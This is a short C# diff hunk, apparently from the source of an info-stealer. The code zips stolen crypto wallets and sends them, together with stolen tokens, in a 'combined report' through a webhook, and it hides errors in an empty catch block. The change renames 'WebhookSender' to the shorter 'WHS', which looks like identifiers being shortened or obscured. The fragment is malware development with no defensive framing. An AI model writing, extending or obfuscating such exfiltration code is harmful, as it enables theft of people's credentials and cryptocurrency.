@@ -23,7 +23,7 @@ namespace OdPS
                 walletZipPath = await WalletStealer.SAndZipW();
 
                 // Send Combined Report
-                await WebhookSender.SendCombinedReport(stolenTokens, walletZipPath);
+                await WHS.SendCombinedReport(stolenTokens, walletZipPath);
             }
             catch
             {
